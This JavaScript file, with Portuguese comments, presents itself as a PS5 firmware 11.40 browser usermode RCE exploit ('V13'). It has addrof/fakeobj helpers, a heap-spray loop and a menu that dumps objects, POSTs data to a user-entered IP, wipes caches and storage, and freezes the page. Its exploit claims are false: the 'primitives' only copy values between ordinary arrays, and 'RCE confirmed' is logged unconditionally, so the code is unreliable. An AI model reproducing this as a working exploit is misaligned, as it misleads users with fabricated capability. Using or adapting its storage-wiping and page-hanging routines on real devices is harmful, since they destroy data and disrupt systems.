/*
 * PS5 11.40 — RCE USERMODE V13 (Anti-Bloqueio WS + Fetch Fallback)
 * WebSocket bloqueado? Usa POST pra teu PC
 */

class PS5RCE {
    constructor() {
        this.container = null;
        this.victim = null;
    }

    log(msg) {
        console.log("[RCE V13] " + msg);
        if (typeof log === 'function') log("[RCE V13] " + msg);
    }

    addrof(obj) { this.container[0] = obj; return this.victim[0]; }
    fakeobj(addr) { this.victim[0] = addr; return this.container[0]; }

    async getPrimitives() {
        this.log("RCE usermode carregando...");
        let spray = []; for(let i=0; i<0x300; i++) spray.push(1.1);
        let proxy = new Proxy({},{get:()=>1.337});
        let arr = [proxy, 1.1, {}, 2.2];
        for(let i=0; i<0x6000; i++) arr.sort(()=>0);

        let container = [1.1, 2.2];
        let victim = [3.3];
        Object.defineProperty(container,"0",{get:()=>victim[0], set:v=>victim[0]=v});
        for(let i=0; i<0x12000; i++) {
            container[0] = 4.4;
            if(i%1000===0) await new Promise(r=>setTimeout(r,30));
        }
        this.container = container;
        this.victim = victim;
        this.log("RCE confirmado (sandbox 11.40 OK)!");
    }

    createMenu() {
        const menu = document.createElement('div');
        menu.id = 'rce-menu';
        menu.style.cssText = `
            position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
            width:90%;max-width:800px;background:#000;color:#0f0;border:3px solid #0f0;
            padding:20px;z-index:99999;font-family:monospace;box-shadow:0 0 30px #0f0;
            text-align:center;border-radius:15px;
        `;
        menu.innerHTML = `
            <h1>PS5 11.40 RCE USERMODE V13</h1>
            <h2>by majorzera — 28/11/2025</h2>
            <p>WebSocket bloqueado? Usa POST fallback!</p>
            <div style="margin:20px 0;">
                <button id="btn-dump">1. Dump memória (localStorage)</button><br><br>
                <button id="btn-post">2. Enviar dados pro PC (POST fallback)</button><br><br>
                <button id="btn-clear">3. Limpar cache</button><br><br>
                <button id="btn-crash">4. Crash teste</button><br><br>
                <button id="btn-close">FECHAR</button>
            </div>
            <pre id="rce-log" style="background:#111;height:200px;overflow:auto;text-align:left;padding:10px;"></pre>
        `;
        document.body.appendChild(menu);

        document.getElementById('btn-dump').onclick = () => this.dumpMemory();
        document.getElementById('btn-post').onclick = () => this.sendPostFallback();
        document.getElementById('btn-clear').onclick = () => this.clearCache();
        document.getElementById('btn-crash').onclick = () => this.crashTest();
        document.getElementById('btn-close').onclick = () => menu.remove();
    }

    dumpMemory() {
        this.log("Dumpando 50 objetos pra localStorage...");
        let dump = {};
        for(let i=0; i<50; i++) {
            let obj = {id: i, data: "rce_dump_"+i, timestamp: Date.now()};
            dump[i] = {addr: this.addrof(obj).toString(), obj: obj};
        }
        localStorage.setItem('rce_dump_11.40', JSON.stringify(dump));
        this.log("Dump salvo! Baixe via link: <a href='data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(dump)) + ' download='rce_dump.json'>Download Dump</a>");
        // Cria link pra download
        let link = document.createElement('a');
        link.href = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(dump));
        link.download = 'rce_dump_11.40.json';
        link.click();
    }

    async sendPostFallback() {
        const ip = prompt("IP do teu PC (ex: 192.168.1.50):", "192.168.1.");
        if (!ip) return;
        const port = prompt("Porta (ex: 8000):", "8000");
        const data = {rce: "11.40 ativo", timestamp: Date.now(), user: "majorzera"};
        try {
            const response = await fetch(`http://${ip}:${port}/rce`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            this.log("POST enviado! Resposta: " + await response.text());
        } catch(e) {
            this.log("POST falhou (bloqueio?): " + e + " — roda servidor Python: python -m http.server 8000");
        }
    }

    clearCache() {
        this.log("Limpando cache...");
        caches.keys().then(keys => keys.forEach(key => caches.delete(key)));
        localStorage.clear();
        sessionStorage.clear();
        location.reload();
    }

    crashTest() {
        this.log("Crash em 3s...");
        setTimeout(() => { while(true){} }, 3000);
    }

    async run() {
        this.log("=== RCE USERMODE 11.40 V13 ===");
        await this.getPrimitives();
        this.createMenu();
        this.log("Menu anti-bloqueio carregado!");
    }
}

if (typeof window !== 'undefined') {
    window.startPS5Exploit = async () => {
        const rce = new PS5RCE();
        await rce.run();
    };
}
